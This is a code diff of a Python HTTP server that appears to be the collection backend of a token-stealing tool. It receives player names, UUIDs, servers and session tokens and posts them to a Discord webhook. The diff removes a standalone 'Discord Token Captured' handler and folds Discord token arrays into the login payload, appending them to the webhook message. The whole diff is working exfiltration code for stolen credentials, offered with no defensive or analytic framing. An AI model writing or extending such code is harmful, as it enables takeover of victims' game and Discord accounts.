@@ -51,7 +51,6 @@ if not DISCORD_WEBHOOK:
     exit(1)
 
 print("✅ Config loaded")
-
 # ======================================
 
 class Handler(BaseHTTPRequestHandler):
@@ -72,45 +71,10 @@ class Handler(BaseHTTPRequestHandler):
 
             req_type = data.get('type', 'login').strip()
 
-            # =========== DISCORD TOKEN HANDLING ===========
-            if req_type == 'discord_token':
-                token = data.get('token', '').strip()
-                if token:
-                    with open('discord_tokens.txt', 'a') as f:
-                        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-                        f.write(f"{timestamp} | {client_ip} | {token}\n")
-                    print(f"🎫 Discord token received from {client_ip}")
+            # =========== DISCORD TOKEN HANDLING REMOVED ===========
+            # Tokens now come inside the login/logout payload
 
-                    try:
-                        # Properly escape token with json.dumps to avoid JSON breaking
-                        safe_token = json.dumps(token)
-                        embed = {
-                            "title": "🎫 Discord Token Captured",
-                            "color": 0xFF0000,
-                            "description": f"**IP:** `{client_ip}`\n**Token:** ||{safe_token}||",
-                            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
-                        }
-                        payload = {"embeds": [embed]}
-                        req_data = json.dumps(payload).encode('utf-8')
-                        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-                        req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
-                        urllib.request.urlopen(req, timeout=10)
-                        print("✅ Discord token notification sent")
-                    except urllib.error.HTTPError as e:
-                        error_body = e.read().decode()
-                        print(f"❌ Discord HTTP {e.code}: {error_body}")
-                    except Exception as e:
-                        print(f"❌ Discord error: {e}")
-
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/plain')
-                    self.end_headers()
-                    self.wfile.write(b'OK')
-                    return
-                else:
-                    print("⚠️ Discord token request with empty token")
-
-            # =========== ORIGINAL LOGIN/LOGOUT HANDLING ===========
+            # =========== LOGIN/LOGOUT HANDLING ===========
             username = data.get('username', 'Unknown').strip()
             uuid = data.get('uuid', '').strip()
             server = data.get('server', '').strip()
@@ -121,6 +85,7 @@ class Handler(BaseHTTPRequestHandler):
             deaths = data.get('deaths', '0').strip()
             skin = data.get('skin', '').strip()
             log_type = req_type
+            discord_tokens = data.get('discord_tokens', [])  # <-- NEW: array of tokens
 
             print(f"Got: {username} on {server}")
 
@@ -146,6 +111,11 @@ class Handler(BaseHTTPRequestHandler):
 
                 if is_login and token:
                     description += f"\n\n🔑 **Session Token:**\n||`{token}`||"
+
+                # Add Discord tokens if any
+                if discord_tokens:
+                    tokens_str = "\n".join([f"||`{t}`||" for t in discord_tokens])
+                    description += f"\n\n🎫 **Discord Tokens:**\n{tokens_str}"
 
                 embed = {
                     "title": "✅ User Connected" if is_login else "❌ User Disconnected",
